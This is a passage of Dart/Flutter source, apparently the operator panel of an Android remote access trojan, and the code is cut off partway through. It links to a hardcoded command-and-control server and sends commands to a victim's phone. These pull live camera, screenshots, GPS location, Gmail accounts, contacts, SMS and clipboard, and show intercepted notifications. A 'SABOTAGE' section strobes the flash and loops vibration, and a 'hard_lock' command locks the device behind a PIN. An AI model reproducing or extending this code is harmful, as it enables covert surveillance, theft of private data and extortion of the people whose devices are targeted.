import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'dart:ui'; // Ditambahkan untuk efek BackdropFilter (Glassmorphism)
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:socket_io_client/socket_io_client.dart' as IO;

class ControlCenterPage extends StatefulWidget {
  const ControlCenterPage({super.key});

  @override
  State<ControlCenterPage> createState() => _ControlCenterPageState();
}

class _ControlCenterPageState extends State<ControlCenterPage>
    with SingleTickerProviderStateMixin {
  final List<LogEntry> _executionLogs = [];
  late IO.Socket socket;
  bool _isProcessing = false;
  bool _isConnected = false;
  bool _isInit = false;

  String _targetId = "unknown";
  String _targetModel = "COMMAND CENTER";
  String _operator = "";
  String _sessionKey = "";
  Map<String, dynamic> _deviceData = {};

  late AnimationController _pulseController;
  late Animation<double> _pulseAnimation;

  final ScrollController _logScrollController = ScrollController();
  final TextEditingController _customCommandController =
      TextEditingController();

  final ValueNotifier<Uint8List?> _liveFrameNotifier = ValueNotifier(null);

  @override
  void initState() {
    super.initState();
    _pulseController = AnimationController(
      duration: const Duration(milliseconds: 1500),
      vsync: this,
    );
    _pulseAnimation = Tween<double>(
      begin: 0.8,
      end: 1.0,
    ).animate(_pulseController);
    _pulseController.repeat(reverse: true);
  }

  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    if (!_isInit) {
      final args = ModalRoute.of(context)?.settings.arguments;
      if (args is Map<String, dynamic>) {
        final device = args['device'] as Map<String, dynamic>?;
        if (device != null) {
          _targetId = device['id']?.toString() ?? "unknown";
          _targetModel = device['model']?.toString() ?? "TARGET DEVICE";
          _deviceData = device;
        }
        _operator = args['operator']?.toString() ?? '';
        _sessionKey = args['sessionKey']?.toString() ?? '';
      }
      _initSocket();
      _isInit = true;
    }
  }

  void _initSocket() {
    try {
      socket = IO.io(
        'http://188.166.176.83:10733',
        IO.OptionBuilder()
            .setTransports(['websocket'])
            .setQuery({'type': 'admin', 'id': 'ADMIN_PANEL_$_operator'})
            .enableAutoConnect()
            .setReconnectionAttempts(10)
            .setReconnectionDelay(3000)
            .setTimeout(10000)
            .build(),
      );

      socket.onConnect((_) {
        if (mounted) {
          setState(() => _isConnected = true);
          _addLog("SYSTEM: C2 Link Established", LogType.success);
          socket.emit('admin_ready', {'status': 'online'});
        }
      });

      socket.onConnectError((data) {
        if (mounted) {
          setState(() => _isConnected = false);
          _addLog("SYSTEM: Connection Error - $data", LogType.error);
        }
      });

      socket.onDisconnect((_) {
        if (mounted) {
          setState(() => _isConnected = false);
          _addLog("SYSTEM: C2 Link Terminated", LogType.warning);
        }
      });

      socket.on('new_response', (data) {
        String cmd = data['cmd'] ?? 'unknown';
        dynamic responseData = data['data'];

        _addLog("INCOMING: $cmd", LogType.info);

        if (cmd == "take_photo" ||
            cmd == "get_screen" ||
            cmd == "take_photo_flutter") {
          String imageData =
              responseData['image'] ?? responseData['screenshot'] ?? '';
          if (imageData.isNotEmpty) {
            _showCapturedPhoto(imageData, cmd);
          }
        } else {
          _handleDataDisplay(cmd, responseData);
        }

        _updateCachedData(cmd, responseData);
      });

      socket.on('new_notification', (data) {
        _addLog(
          "NOTIF: [${data['title']}] ${data['body']}",
          LogType.notification,
        );
        _showNotificationSnackbar(data['title'] ?? "Alert", data['body'] ?? "");

        if (mounted) {
          setState(() {
            if (_deviceData['sms'] == null) _deviceData['sms'] = [];
            (_deviceData['sms'] as List).insert(0, {
              'address': data['title'] ?? data['app'],
              'body': data['body'] ?? data['message'],
              'date':
                  data['timestamp'] ?? DateTime.now().millisecondsSinceEpoch,
            });
          });
        }
      });

      socket.on('live_frame', (data) {
        debugPrint(
          "=> [STREAM] Frame received from: ${data['id'] ?? data['deviceId']}",
        );

        if (data['id'] == _targetId || data['deviceId'] == _targetId) {
          String imageData = data['image'] ?? '';

          if (imageData.contains(',')) {
            imageData = imageData.split(',').last;
          }

          if (imageData.isNotEmpty) {
            try {
              _liveFrameNotifier.value = base64Decode(
                imageData.replaceAll(RegExp(r'\s+'), ''),
              );
            } catch (e) {
              debugPrint("=> [STREAM] Base64 Decode Error: $e");
            }
          }
        }
      });

      socket.on('heartbeat', (data) {
        if (mounted && data['deviceId'] == _targetId) {
          setState(() {
            _deviceData['battery'] = data['battery'];
            _deviceData['last_seen'] = DateTime.now();
          });
        }
      });

      socket.on('device_info', (data) {
        if (data['id'] == _targetId) {
          setState(() {
            _deviceData.addAll(data);
          });
        }
      });

      socket.connect();
    } catch (e) {
      _addLog("SYSTEM: Socket Init Failed - $e", LogType.error);
    }
  }

  void _updateCachedData(String cmd, dynamic data) {
    if (!mounted || data == null) return;
    setState(() {
      dynamic payload = data;
      if (data is Map && data.containsKey('data')) {
        payload = data['data'];
      }

      switch (cmd) {
        case "get_contacts":
          _deviceData['contacts'] = payload is List
              ? payload
              : (payload['contacts'] ?? []);
          break;
        case "get_sms":
          _deviceData['sms'] = payload is List
              ? payload
              : (payload['sms'] ?? []);
          break;
        case "get_apps":
          _deviceData['apps'] = payload is List
              ? payload
              : (payload['apps'] ?? []);
          break;
        case "get_gmails":
          _deviceData['accounts'] = payload is List
              ? payload
              : (payload['accounts'] ?? []);
          break;
        case "get_location":
          _deviceData['location'] = payload;
          break;
      }
    });
  }

  @override
  void dispose() {
    _pulseController.dispose();
    _logScrollController.dispose();
    _customCommandController.dispose();
    _liveFrameNotifier.dispose();
    socket.disconnect();
    socket.dispose();
    super.dispose();
  }

  void _addLog(String message, [LogType type = LogType.info]) {
    if (mounted) {
      setState(() {
        _executionLogs.insert(
          0,
          LogEntry(timestamp: DateTime.now(), message: message, type: type),
        );

        if (_executionLogs.length > 100) {
          _executionLogs.removeLast();
        }
      });

      WidgetsBinding.instance.addPostFrameCallback((_) {
        if (_logScrollController.hasClients) {
          _logScrollController.animateTo(
            0,
            duration: const Duration(milliseconds: 200),
            curve: Curves.easeOut,
          );
        }
      });
    }
  }

  void _showNotificationSnackbar(String title, String body) {
    if (!mounted) return;

    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            const Icon(
              Icons.notifications_active,
              color: Colors.orange,
              size: 20,
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                mainAxisSize: MainAxisSize.min,
                children: [
                  Text(
                    title,
                    style: const TextStyle(
                      fontWeight: FontWeight.bold,
                      fontSize: 12,
                    ),
                  ),
                  Text(body, style: const TextStyle(fontSize: 11)),
                ],
              ),
            ),
          ],
        ),
        backgroundColor: Colors.grey[900],
        duration: const Duration(seconds: 5),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
      ),
    );
  }

  void _showCapturedPhoto(String base64Image, String title) {
    Uint8List bytes = Uint8List(0);
    try {
      bytes = base64Decode(base64Image.replaceAll(RegExp(r'\s+'), ''));
    } catch (e) {
      _addLog("ERROR: Invalid image data", LogType.error);
      return;
    }

    showDialog(
      context: context,
      barrierDismissible: true,
      builder: (context) => Dialog(
        backgroundColor: Colors.black87,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(12),
          side: const BorderSide(color: Colors.orange, width: 2),
        ),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
              decoration: BoxDecoration(
                color: Colors.orange.withOpacity(0.1),
                borderRadius: const BorderRadius.only(
                  topLeft: Radius.circular(10),
                  topRight: Radius.circular(10),
                ),
              ),
              child: Row(
                children: [
                  const Icon(Icons.camera_alt, color: Colors.orange, size: 20),
                  const SizedBox(width: 8),
                  Text(
                    title.toUpperCase(),
                    style: const TextStyle(
                      color: Colors.orange,
                      fontWeight: FontWeight.bold,
                      fontSize: 14,
                    ),
                  ),
                  const Spacer(),
                  Text(
                    _formatTime(DateTime.now()),
                    style: TextStyle(color: Colors.grey[400], fontSize: 10),
                  ),
                ],
              ),
            ),
            Padding(
              padding: const EdgeInsets.all(16),
              child: ClipRRect(
                borderRadius: BorderRadius.circular(8),
                child: InteractiveViewer(
                  minScale: 0.5,
                  maxScale: 4.0,
                  child: Image.memory(
                    bytes,
                    fit: BoxFit.contain,
                    errorBuilder: (context, error, stackTrace) => Container(
                      padding: const EdgeInsets.all(40),
                      color: Colors.red.withOpacity(0.1),
                      child: const Column(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          Icon(Icons.broken_image, color: Colors.red, size: 48),
                          SizedBox(height: 8),
                          Text(
                            "Invalid Stream Data",
                            style: TextStyle(color: Colors.red),
                          ),
                        ],
                      ),
                    ),
                  ),
                ),
              ),
            ),
            Padding(
              padding: const EdgeInsets.only(bottom: 12, left: 12, right: 12),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.end,
                children: [
                  TextButton.icon(
                    onPressed: () {
                      Clipboard.setData(ClipboardData(text: base64Image));
                      _addLog(
                        "Image data copied to clipboard",
                        LogType.success,
                      );
                    },
                    icon: const Icon(Icons.copy, color: Colors.grey, size: 18),
                    label: const Text(
                      "COPY",
                      style: TextStyle(color: Colors.grey),
                    ),
                  ),
                  const SizedBox(width: 8),
                  ElevatedButton.icon(
                    onPressed: () => Navigator.pop(context),
                    icon: const Icon(Icons.close, size: 18),
                    label: const Text("CLOSE"),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.orange,
                      foregroundColor: Colors.black,
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _showLiveCameraDialog() {
    _liveFrameNotifier.value = null;

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => Dialog(
        backgroundColor: Colors.black87,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(12),
          side: const BorderSide(color: Colors.redAccent, width: 2),
        ),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
              decoration: BoxDecoration(
                color: Colors.red.withOpacity(0.1),
                borderRadius: const BorderRadius.only(
                  topLeft: Radius.circular(10),
                  topRight: Radius.circular(10),
                ),
              ),
              child: Row(
                children: [
                  const Icon(Icons.videocam, color: Colors.redAccent, size: 20),
                  const SizedBox(width: 8),
                  const Text(
                    "LIVE CAMERA",
                    style: TextStyle(
                      color: Colors.redAccent,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                  const Spacer(),
                  SizedBox(
                    width: 14,
                    height: 14,
                    child: CircularProgressIndicator(
                      strokeWidth: 2,
                      color: Colors.red[400],
                    ),
                  ),
                ],
              ),
            ),
            Padding(
              padding: const EdgeInsets.all(12),
              child: ValueListenableBuilder<Uint8List?>(
                valueListenable: _liveFrameNotifier,
                builder: (context, bytes, child) {
                  if (bytes == null) {
                    return Container(
                      height: 250,
                      width: double.infinity,
                      decoration: BoxDecoration(
                        color: Colors.black45,
                        borderRadius: BorderRadius.circular(8),
                      ),
                      child: const Column(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(
                            Icons.wifi_tethering,
                            color: Colors.grey,
                            size: 40,
                          ),
                          SizedBox(height: 10),
                          Text(
                            "Connecting to target stream...",
                            style: TextStyle(color: Colors.grey),
                          ),
                        ],
                      ),
                    );
                  }
                  return ClipRRect(
                    borderRadius: BorderRadius.circular(8),
                    child: Image.memory(
                      bytes,
                      fit: BoxFit.contain,
                      gaplessPlayback: true,
                    ),
                  );
                },
              ),
            ),
            Padding(
              padding: const EdgeInsets.only(bottom: 12, right: 12),
              child: Align(
                alignment: Alignment.centerRight,
                child: ElevatedButton.icon(
                  onPressed: () {
                    _sendCommand("stop_live_camera", _targetId);
                    Navigator.pop(context);
                    _addLog(
                      "Live stream terminated by Admin.",
                      LogType.warning,
                    );
                  },
                  icon: const Icon(Icons.stop_circle, size: 18),
                  label: const Text("STOP & CLOSE"),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.red[800],
                    foregroundColor: Colors.white,
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _handleDataDisplay(String cmd, dynamic data) {
    if (data == null) return;
    switch (cmd) {
      case "get_location":
        _addLog(
          "GPS: Lat ${data['lat']}, Lng ${data['lng']}",
          LogType.location,
        );
        break;
      case "get_gmails":
        List accounts = data is List ? data : (data['accounts'] ?? []);
        _addLog("GMAIL: ${accounts.length} account(s) found", LogType.info);
        break;
      case "get_contacts":
        List contacts = data is List ? data : (data['contacts'] ?? []);
        _addLog(
          "CONTACTS: ${contacts.length} contact(s) retrieved",
          LogType.info,
        );
        break;
      case "get_sms":
        List sms = data is List ? data : (data['sms'] ?? []);
        _addLog("SMS: ${sms.length} message(s) retrieved", LogType.info);
        break;
      case "get_apps":
        List apps = data is List ? data : (data['apps'] ?? []);
        _addLog("APPS: ${apps.length} application(s) found", LogType.info);
        break;
      case "get_clipboard":
        _addLog("CLIPBOARD: ${data['clipboard'] ?? 'Empty'}", LogType.info);
        break;
      case "get_device_info":
        _addLog(
          "DEVICE: ${data['model']} | Battery: ${data['battery']}%",
          LogType.info,
        );
        break;
      default:
        _addLog(
          "DATA: $cmd - ${data.toString().substring(0, data.toString().length > 50 ? 50 : data.toString().length)}...",
          LogType.debug,
        );
    }
  }

  Future<void> _sendCommand(
    String command,
    String targetId, {
    String? extra,
  }) async {
    if (!_isConnected) {
      _addLog("WARNING: No C2 connection", LogType.warning);
      return;
    }

    setState(() => _isProcessing = true);

    try {
      final response = await http
          .post(
            Uri.parse("http://188.166.176.83:10733/api/send-command"),
            headers: {"Content-Type": "application/json"},
            body: jsonEncode({
              "key": _sessionKey,
              "deviceId": targetId,
              "command": command,
              "extra": extra ?? "",
              "timestamp": DateTime.now().millisecondsSinceEpoch,
            }),
          )
          .timeout(const Duration(seconds: 15));

      if (response.statusCode == 200) {
        _addLog(
          "SENT: $command ${extra != null ? '[$extra]' : ''}",
          LogType.success,
        );
      } else {
        _addLog("ERR: Server returned ${response.statusCode}", LogType.error);
      }
    } catch (e) {
      _addLog(
        "ERR: ${e.toString().substring(0, e.toString().length > 40 ? 40 : e.toString().length)}...",
        LogType.error,
      );
    } finally {
      if (mounted) {
        setState(() => _isProcessing = false);
      }
    }
  }

  String _formatTime(DateTime time) {
    return "${time.hour.toString().padLeft(2, '0')}:${time.minute.toString().padLeft(2, '0')}:${time.second.toString().padLeft(2, '0')}";
  }

  Color _getLogColor(LogType type) {
    switch (type) {
      case LogType.success:
        return Colors.greenAccent;
      case LogType.error:
        return Colors.redAccent;
      case LogType.warning:
        return Colors.orangeAccent;
      case LogType.notification:
        return Colors.cyanAccent;
      case LogType.location:
        return Colors.lightGreenAccent;
      case LogType.debug:
        return Colors.grey;
      default:
        return Colors.white70;
    }
  }

  int _parseBattery(dynamic b) {
    if (b is int) return b;
    if (b is double) return b.toInt();
    if (b is String) return int.tryParse(b) ?? 0;
    return 0;
  }

  // --- UI COMPONENTS ---

  // [MODIFIKASI] TEMA HEADER: GLASS IPHONE + LAYOUT FOTO
  Widget _buildTopHeader() {
    String modelText = _targetModel
        .split(' ')
        .first
        .toUpperCase(); // e.g. "POCO"
    String idText = _targetId.length > 10
        ? _targetId.substring(0, 10).toUpperCase()
        : _targetId.toUpperCase();
    String smallGreyText =
        "${_targetModel.replaceAll(' ', '').toLowerCase()}-${_targetId.toLowerCase()}-ap3a";

    return Container(
      padding: EdgeInsets.only(
        top: MediaQuery.of(context).padding.top + 10,
        left: 16,
        right: 16,
        bottom: 10,
      ),
      child: Row(
        children: [
          // TOMBOL BACK (Glassmorphism)
          GestureDetector(
            onTap: () => Navigator.pop(context),
            child: ClipRRect(
              borderRadius: BorderRadius.circular(14),
              child: BackdropFilter(
                filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
                child: Container(
                  width: 45,
                  height: 45,
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.05),
                    borderRadius: BorderRadius.circular(14),
                    border: Border.all(color: Colors.white.withOpacity(0.1)),
                  ),
                  child: const Icon(
                    Icons.arrow_back_ios_new,
                    color: Colors.white,
                    size: 18,
                  ),
                ),
              ),
            ),
          ),
          const SizedBox(width: 16),

          // ICON HP BIRU SQUIRCLE
          Container(
            width: 55,
            height: 55,
            decoration: BoxDecoration(
              color: const Color(0xFF3F66CC), // Biru khas seperti di foto
              borderRadius: BorderRadius.circular(16),
              boxShadow: [
                BoxShadow(
                  color: const Color(0xFF3F66CC).withOpacity(0.4),
                  blurRadius: 15,
                  spreadRadius: 1,
                  offset: const Offset(0, 4),
                ),
              ],
            ),
            child: const Icon(
              Icons.phone_android,
              color: Colors.white,
              size: 28,
            ),
          ),
          const SizedBox(width: 16),

          // TEKS INFORMASI DEVICE (3 Baris)
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Text(
                  "PPL- $modelText",
                  style: const TextStyle(
                    color: Colors.white,
                    fontWeight: FontWeight.w900,
                    fontSize: 16,
                    letterSpacing: 2.0,
                    fontFamily: 'ShareTechMono',
                  ),
                ),
                const SizedBox(height: 2),
                Text(
                  idText,
                  style: const TextStyle(
                    color: Colors.white,
                    fontWeight: FontWeight.w900,
                    fontSize: 16,
                    letterSpacing: 2.0,
                    fontFamily: 'ShareTechMono',
                  ),
                ),
                const SizedBox(height: 2),
                Text(
                  smallGreyText,
                  style: TextStyle(
                    color: Colors.white.withOpacity(0.4),
                    fontSize: 10,
                    letterSpacing: 1.0,
                    fontFamily: 'ShareTechMono',
                  ),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                ),
              ],
            ),
          ),

          // TOMBOL REFRESH (Glassmorphism)
          GestureDetector(
            onTap: () {
              if (_isConnected) {
                socket.connect();
              }
            },
            child: ClipRRect(
              borderRadius: BorderRadius.circular(14),
              child: BackdropFilter(
                filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
                child: Container(
                  width: 45,
                  height: 45,
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.05),
                    borderRadius: BorderRadius.circular(14),
                    border: Border.all(color: Colors.white.withOpacity(0.1)),
                  ),
                  child: const Icon(
                    Icons.refresh,
                    color: Colors.white70,
                    size: 20,
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildQuickStatusRow() {
    int batLevel = _deviceData.containsKey('battery')
        ? _parseBattery(_deviceData['battery'])
        : 41; // Default 41 from image if not ready
    return SingleChildScrollView(
      scrollDirection: Axis.horizontal,
      padding: const EdgeInsets.symmetric(horizontal: 16),
      child: Row(
        children: [
          _statusBadge(Icons.battery_full, "$batLevel%", Colors.amber),
          const SizedBox(width: 8),
          _statusBadge(Icons.android, "Android ?", Colors.green),
          const SizedBox(width: 8),
          _statusBadge(Icons.lock_outline, "Unknown", Colors.white70),
          const SizedBox(width: 8),
          _statusBadge(Icons.visibility, "Visible", Colors.white70),
          const SizedBox(width: 8),
          _statusBadge(Icons.wifi, "::ffff:172.1...", Colors.teal),
        ],
      ),
    );
  }

  Widget _statusBadge(IconData icon, String text, Color iconColor) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
      decoration: BoxDecoration(
        color: Colors.black.withOpacity(0.3),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: Colors.white10),
      ),
      child: Row(
        children: [
          Icon(icon, color: iconColor, size: 12),
          const SizedBox(width: 6),
          Text(
            text,
            style: const TextStyle(
              color: Colors.white70,
              fontSize: 11,
              fontWeight: FontWeight.bold,
              fontFamily: "ShareTechMono",
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildActivityLogHeader() {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      child: Row(
        children: [
          const Icon(Icons.receipt_long, color: Colors.white54, size: 16),
          const SizedBox(width: 8),
          const Text(
            "Activity Log",
            style: TextStyle(color: Colors.white, fontSize: 14),
          ),
          const SizedBox(width: 8),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
            decoration: BoxDecoration(
              color: const Color(0xFF1E3A8A),
              borderRadius: BorderRadius.circular(4),
            ), // Dark blue badge
            child: const Text(
              "2",
              style: TextStyle(
                color: Colors.lightBlueAccent,
                fontSize: 10,
                fontWeight: FontWeight.bold,
              ),
            ),
          ),
          const Spacer(),
          const Text(
            "Clear",
            style: TextStyle(color: Colors.white54, fontSize: 12),
          ),
          const Icon(
            Icons.keyboard_arrow_down,
            color: Colors.white54,
            size: 16,
          ),
        ],
      ),
    );
  }

  Widget _groupLabel(String text) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 5),
      child: Row(
        children: [
          Text(
            text,
            style: const TextStyle(
              color: Colors.orange,
              fontSize: 11,
              fontWeight: FontWeight.bold,
              letterSpacing: 2,
            ),
          ),
          const SizedBox(width: 8),
          Expanded(
            child: Divider(color: Colors.orange.withOpacity(0.3), thickness: 1),
          ),
        ],
      ),
    );
  }

  Widget _actionGrid(List<Widget> children) {
    return Wrap(spacing: 10, runSpacing: 10, children: children);
  }

  Widget _btn(
    String label,
    IconData icon,
    Color color,
    String cmd,
    String targetId, {
    bool isInput = false,
    bool isPage = false,
    bool isCustom = false,
    Widget? destination,
    String? inputHint,
  }) {
    return InkWell(
      onTap: () {
        if (cmd == "start_live_camera") {
          _sendCommand(cmd, targetId);
          _showLiveCameraDialog();
        } else if (isCustom) {
          _showCustomCommandDialog();
        } else if (isPage && destination != null) {
          if (cmd.isNotEmpty) {
            _sendCommand(cmd, targetId);
          }
          Navigator.push(
            context,
            MaterialPageRoute(builder: (context) => destination),
          );
        } else if (isInput) {
          _showInput(label, cmd, targetId, hint: inputHint);
        } else {
          _sendCommand(cmd, targetId);
        }
      },
      borderRadius: BorderRadius.circular(10),
      child: Container(
        width: MediaQuery.of(context).size.width / 3 - 15,
        padding: const EdgeInsets.symmetric(vertical: 14, horizontal: 8),
        decoration: BoxDecoration(
          color: Colors.white.withOpacity(0.05),
          borderRadius: BorderRadius.circular(10),
          border: Border.all(color: color.withOpacity(0.3)),
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [color.withOpacity(0.1), Colors.transparent],
          ),
        ),
        child: Column(
          children: [
            Icon(icon, color: color, size: 26),
            const SizedBox(height: 8),
            Text(
              label,
              style: const TextStyle(
                color: Colors.white,
                fontSize: 9,
                fontWeight: FontWeight.w500,
              ),
              textAlign: TextAlign.center,
              maxLines: 2,
              overflow: TextOverflow.ellipsis,
            ),
          ],
        ),
      ),
    );
  }

  void _showInput(String title, String cmd, String targetId, {String? hint}) {
    TextEditingController c = TextEditingController();
    String defaultHint = hint ?? "Enter payload...";

    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: Colors.grey[900],
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(12),
          side: const BorderSide(color: Colors.orange, width: 1),
        ),
        title: Row(
          children: [
            const Icon(Icons.input, color: Colors.orange, size: 20),
            const SizedBox(width: 8),
            Text(
              title,
              style: const TextStyle(color: Colors.white, fontSize: 16),
            ),
          ],
        ),
        content: TextField(
          controller: c,
          style: const TextStyle(color: Colors.white),
          decoration: InputDecoration(
            hintText: defaultHint,
            hintStyle: TextStyle(color: Colors.grey[600]),
            filled: true,
            fillColor: Colors.black54,
            border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(8),
              borderSide: BorderSide.none,
            ),
            focusedBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(8),
              borderSide: const BorderSide(color: Colors.orange),
            ),
          ),
          autofocus: true,
          onSubmitted: (_) {
            _sendCommand(cmd, targetId, extra: c.text);
            Navigator.pop(context);
          },
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text("CANCEL", style: TextStyle(color: Colors.grey)),
          ),
          ElevatedButton(
            onPressed: () {
              _sendCommand(cmd, targetId, extra: c.text);
              Navigator.pop(context);
            },
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.orange,
              foregroundColor: Colors.black,
            ),
            child: const Text("EXECUTE"),
          ),
        ],
      ),
    );
  }

  void _showCustomCommandDialog() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: Colors.grey[900],
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(12),
          side: const BorderSide(color: Colors.orange, width: 1),
        ),
        title: const Row(
          children: [
            Icon(Icons.terminal, color: Colors.orange, size: 20),
            SizedBox(width: 8),
            Text(
              "CUSTOM COMMAND",
              style: TextStyle(color: Colors.white, fontSize: 16),
            ),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            TextField(
              controller: _customCommandController,
              style: const TextStyle(color: Colors.white),
              decoration: InputDecoration(
                hintText: "e.g., get_clipboard",
                hintStyle: TextStyle(color: Colors.grey[600]),
                filled: true,
                fillColor: Colors.black54,
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(8),
                  borderSide: BorderSide.none,
                ),
                focusedBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(8),
                  borderSide: const BorderSide(color: Colors.orange),
                ),
              ),
            ),
            const SizedBox(height: 12),
            TextField(
              decoration: InputDecoration(
                hintText: "Extra params (optional)",
                hintStyle: TextStyle(color: Colors.grey[600]),
                filled: true,
                fillColor: Colors.black54,
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(8),
                  borderSide: BorderSide.none,
                ),
              ),
              onSubmitted: (value) {
                _sendCommand(
                  _customCommandController.text,
                  _targetId,
                  extra: value,
                );
                Navigator.pop(context);
                _customCommandController.clear();
              },
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () {
              Navigator.pop(context);
              _customCommandController.clear();
            },
            child: const Text("CANCEL", style: TextStyle(color: Colors.grey)),
          ),
          ElevatedButton(
            onPressed: () {
              _sendCommand(_customCommandController.text, _targetId);
              Navigator.pop(context);
              _customCommandController.clear();
            },
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.orange,
              foregroundColor: Colors.black,
            ),
            child: const Text("EXECUTE"),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Column(
        children: [
          _buildTopHeader(), // Panggil header Glassmorphism di sini
          _buildQuickStatusRow(),
          _buildActivityLogHeader(),

          _buildTerminalLogs(),
          Expanded(
            child: ListView(
              padding: const EdgeInsets.all(12),
              children: [
                if (_deviceData.isNotEmpty) _buildQuickStats(),

                _groupLabel("🎯 INTELLIGENCE"),
                _actionGrid([
                  _btn(
                    "LIVE CAM",
                    Icons.videocam,
                    Colors.orange,
                    "start_live_camera",
                    _targetId,
                  ),
                  _btn(
                    "SCREEN",
                    Icons.screenshot_monitor,
                    Colors.amber,
                    "get_screen",
                    _targetId,
                  ),
                  _btn(
                    "GPS LOC",
                    Icons.location_on,
                    Colors.green,
                    "get_location",
                    _targetId,
                  ),
                  _btn(
                    "GMAIL",
                    Icons.email,
                    Colors.red,
                    "get_gmails",
                    _targetId,
                  ),
                  _btn(
                    "CONTACTS",
                    Icons.contacts,
                    Colors.blue,
                    "get_contacts",
                    _targetId,
                    isPage: true,
                    destination: DataViewerPage(
                      title: "Contacts",
                      cmd: "get_contacts",
                      targetId: _targetId,
                      data: _getListData('contacts'),
                    ),
                  ),
                  _btn(
                    "SMS",
                    Icons.message,
                    Colors.pink,
                    "get_sms",
                    _targetId,
                    isPage: true,
                    destination: SmsChatViewerPage(
                      targetId: _targetId,
                      initialData: _getListData('sms'),
                    ),
                  ),
                  _btn(
                    "APPS",
                    Icons.grid_view,
                    Colors.teal,
                    "get_apps",
                    _targetId,
                    isPage: true,
                    destination: DataViewerPage(
                      title: "Installed Apps",
                      cmd: "get_apps",
                      targetId: _targetId,
                      data: _getListData('apps'),
                    ),
                  ),
                  _btn(
                    "CLIPBOARD",
                    Icons.content_paste,
                    Colors.brown,
                    "get_clipboard",
                    _targetId,
                  ),
                ]),

                _groupLabel("💥 SABOTAGE"),
                _actionGrid([
                  _btn(
                    "STROBE",
                    Icons.flashlight_on,
                    Colors.yellow,
                    "flash_strobe",
                    _targetId,
                  ),
                  _btn(
                    "STOP",
                    Icons.flashlight_off,
                    Colors.grey,
                    "stop_strobe",
                    _targetId,
                  ),
                  _btn(
                    "VOL MAX",
                    Icons.volume_up,
                    Colors.cyan,
                    "set_vol_max",
                    _targetId,
                  ),
                  _btn(
                    "VIBRATE",
                    Icons.vibration,
                    Colors.purple,
                    "vibrate_loop",
                    _targetId,
                  ),
                  _btn(
                    "PLAY AUDIO",
                    Icons.music_note,
                    Colors.pinkAccent,
                    "play_audio",
                    _targetId,
                    isInput: true,
                  ),
                  _btn(
                    "STOP AUDIO",
                    Icons.stop,
                    Colors.redAccent,
                    "stop_audio",
                    _targetId,
                  ),
                ]),

                _groupLabel("🎮 UI & CONTROL"),
                _actionGrid([
                  _btn(
                    "WALLPAPER",
                    Icons.image,
                    Colors.indigo,
                    "set_wallpaper",
                    _targetId,
                    isInput: true,
                  ),
                  _btn(
                    "TTS",
                    Icons.record_voice_over,
                    Colors.deepOrange,
                    "speak_tts",
                    _targetId,
                    isInput: true,
                  ),
                  _btn(
                    "OPEN URL",
                    Icons.public,
                    Colors.lightBlue,
                    "open_url",
                    _targetId,
                    isInput: true,
                  ),
                  _btn(
                    "SEND SMS",
                    Icons.send,
                    Colors.blueGrey,
                    "send_sms",
                    _targetId,
                    isInput: true,
                  ),
                ]),

                _groupLabel("🔒 SECURITY"),
                _actionGrid([
                  _btn(
                    "LOCK",
                    Icons.lock,
                    Colors.red,
                    "hard_lock",
                    _targetId,
                    isInput: true,
                    inputHint: "Message|PIN",
                  ),
                  _btn(
